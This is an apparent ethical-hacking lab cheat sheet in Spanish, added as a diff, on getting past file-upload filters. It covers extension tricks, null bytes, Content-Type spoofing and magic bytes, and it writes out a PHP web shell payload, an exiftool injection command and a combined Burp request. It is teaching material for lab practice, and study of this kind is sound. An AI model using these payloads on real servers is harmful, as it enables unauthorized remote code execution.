@@ -1,0 +1,176 @@
+================================================================
+  Evasion de Filtros - File Upload
+  D1n0 | Ethical Hacking Lab
+================================================================
+
+  Herramienta: Interceptar la peticion con BurpSuite y modificar
+  el campo "filename" en el cuerpo del multipart/form-data.
+
+----------------------------------------------------------------
+LISTAS NEGRAS (blacklist)
+----------------------------------------------------------------
+
+El servidor bloquea extensiones conocidas como ".php".
+Objetivo: usar una extension que el servidor no tenga en su lista
+pero que el interprete PHP si reconozca.
+
+Extensiones alternativas de PHP (interpretadas como PHP):
+  .php1  .php2  .php3  .php4  .php5  .php7
+  .pHp   .pHP   .PHp   .PHP   .pHpP  .PhP
+  .phtml .phar  .phps  .php.bak
+
+Ejemplo en BurpSuite:
+  Content-Disposition: form-data; name="file"; filename="shell.php"
+                                                                ^^^^
+  Cambiar por:  filename="shell.php5"   o   filename="shell.pHp"
+
+Notas:
+  - La configuracion de Apache/Nginx determina que extensiones
+    se pasan al interprete PHP (AddHandler, FilesMatch...).
+  - Vale la pena probar varias si las primeras no funcionan.
+  - A veces el filtro es case-sensitive: .PHP pasa aunque .php no.
+
+----------------------------------------------------------------
+LISTAS BLANCAS (whitelist)
+----------------------------------------------------------------
+
+El servidor solo permite extensiones concretas (ej: .jpg, .png).
+Objetivo: hacer que el filtro "vea" la extension permitida pero
+que el servidor ejecute el archivo como PHP.
+
+Tecnica: Null Byte  (%00)
+  El null byte (%00) termina la string en C. Si el filtro valida
+  la extension en C/C++ pero PHP lee el nombre completo:
+
+    filename="shell.php%00.jpg"
+    filename="shell.php%00.png"
+
+  El filtro lee --> termina en .jpg  --> PERMITIDO
+  El servidor guarda --> shell.php   --> EJECUTADO como PHP
+
+  NOTA: Funciona en PHP < 5.3.4 y en algunos entornos legacy.
+  En versiones modernas de PHP ya no es efectivo.
+
+Otras variantes con separadores:
+  filename="shell.php;.jpg"        separador de parametros
+  filename="shell.php:.jpg"        stream alternativo (Windows/IIS)
+  filename="shell.php .jpg"        espacio antes de la extension
+  filename="shell.php#.jpg"        fragmento de URL
+  filename="shell.php/.jpg"        path traversal minimo
+
+Doble extension (si el filtro solo mira la ultima):
+  filename="shell.jpg.php"         el servidor ejecuta el ultimo
+  filename="shell.php.jpg"         el filtro ve .jpg, Apache puede
+                                   ejecutar .php si FilesMatch lo permite
+
+----------------------------------------------------------------
+POR CONTENT-TYPE
+----------------------------------------------------------------
+
+Algunos filtros no miran la extension sino el header Content-Type
+que envia el navegador en la peticion multipart.
+
+  Peticion normal:
+    Content-Disposition: form-data; name="file"; filename="shell.php"
+    Content-Type: application/x-php             <-- BLOQUEADO
+
+  Bypass: cambiar en BurpSuite a un tipo permitido:
+    Content-Type: image/jpeg
+    Content-Type: image/png
+    Content-Type: image/gif
+
+  El servidor recibe image/png --> lo considera valido --> guarda
+  el archivo como .php --> se ejecuta.
+
+  Nota: es el bypass mas trivial porque el Content-Type lo
+  controla el cliente. Un filtro serio no deberia confiar en el solo.
+
+----------------------------------------------------------------
+POR CONTENIDO (magic bytes)
+----------------------------------------------------------------
+
+Un filtro robusto lee los primeros bytes del archivo para verificar
+que realmente es una imagen, ignorando extension y Content-Type.
+
+Magic bytes de formatos comunes:
+  GIF  -->  ASCII "GIF89a" o "GIF87a"
+  PNG  -->  \x89PNG\r\n\x1a\n
+  JPEG -->  \xFF\xD8\xFF
+
+Tecnica A: anteponer magic bytes al payload PHP
+
+  En el cuerpo del archivo escribes:
+    GIF89a;<?php system($_GET['cmd']); ?>
+
+  El filtro lee los primeros bytes --> GIF valido --> PERMITIDO
+  PHP ejecuta el archivo e interpreta el bloque <?php ... ?>
+
+Tecnica B: incrustar el payload en metadatos EXIF de imagen real
+
+  exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagen.png
+
+  La imagen sigue siendo un PNG valido que pasa el analisis
+  de contenido. El payload PHP esta en los metadatos EXIF.
+
+  Verificar:
+    exiftool imagen.png | grep Comment
+
+----------------------------------------------------------------
+BYPASS COMPLETO (combinando las 3 capas)
+----------------------------------------------------------------
+
+La evasion mas completa ataca los tres filtros simultaneamente:
+
+  CONTENIDO  -->  magic bytes + payload PHP
+  FILENAME   -->  shell.php%00.png
+  CONTENT-TYPE --> image/png
+
+Peticion resultante en BurpSuite:
+
+  Content-Disposition: form-data; name="file"; filename="shell.php%00.png"
+  Content-Type: image/png
+
+  GIF89a;<?php system($_GET['cmd']); ?>
+
+Que ve cada filtro:
+  Filtro de extension   --> ve .png              --> PERMITIDO
+  Filtro de MIME type   --> ve image/png         --> PERMITIDO
+  Filtro de magic bytes --> ve GIF89a            --> PERMITIDO
+  Servidor al ejecutar  --> interpreta <?php ... --> EJECUTADO
+
+IMPORTANTE: el null byte en filename solo funciona en PHP < 5.3.4
+y entornos legacy (como DVWA en el lab). En sistemas modernos
+sustituir por .php5, .phtml u otra tecnica de blacklist.
+
+----------------------------------------------------------------
+FLUJO EN BURPSUITE
+----------------------------------------------------------------
+
+  1. Activa Intercept (Proxy > Intercept > On)
+  2. Sube el archivo desde la web
+  3. BurpSuite captura la peticion POST
+  4. Localiza las cabeceras del bloque multipart:
+       Content-Disposition: form-data; name="file"; filename="imagen.jpg"
+       Content-Type: image/jpeg
+  5. Modifica las tres capas segun lo que aplique
+  6. Forward --> observa la respuesta
+
+  TIP: Manda la peticion al Repeater (Ctrl+R) para probar
+  multiples variantes sin repetir el proceso manualmente.
+
+----------------------------------------------------------------
+RESUMEN DE CAPAS Y BYPASSES
+----------------------------------------------------------------
+
+  Filtro              Mira                  Bypass
+  ----------------------------------------------------------------
+  Blacklist extension filename              .php5, .pHp, .phtml...
+  Whitelist extension filename              null byte, doble ext
+  Content-Type        header MIME           cambiar a image/png
+  Magic bytes         primeros bytes        GIF89a; antes del payload
+  Metadatos EXIF      contenido del archivo exiftool -Comment='<?php'
+
+  Bypass combinado (mas completo):
+    filename="shell.php%00.png"  +  Content-Type: image/png  +  GIF89a;<?php...
+
+================================================================
